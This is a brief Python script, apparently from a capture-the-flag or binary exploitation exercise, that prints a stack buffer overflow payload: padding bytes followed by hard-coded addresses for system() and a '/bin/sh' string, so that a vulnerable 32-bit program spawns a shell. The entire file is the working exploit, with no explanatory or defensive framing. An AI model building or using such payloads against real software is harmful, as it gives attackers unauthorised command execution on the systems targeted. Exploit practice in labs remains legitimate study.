import sys

sys_addy = 0x804fef0 # p system
bin_addy = 0x80b0bcc
ech_addy = 0x80b04fc

sys.stdout.buffer.write((b'AAAAAAAAAAAAAAAAAAAAAA' + sys_addy.to_bytes(4, 'little') + b'AAAA'+ bin_addy.to_bytes(4, 'little') + b'/bin/sh'))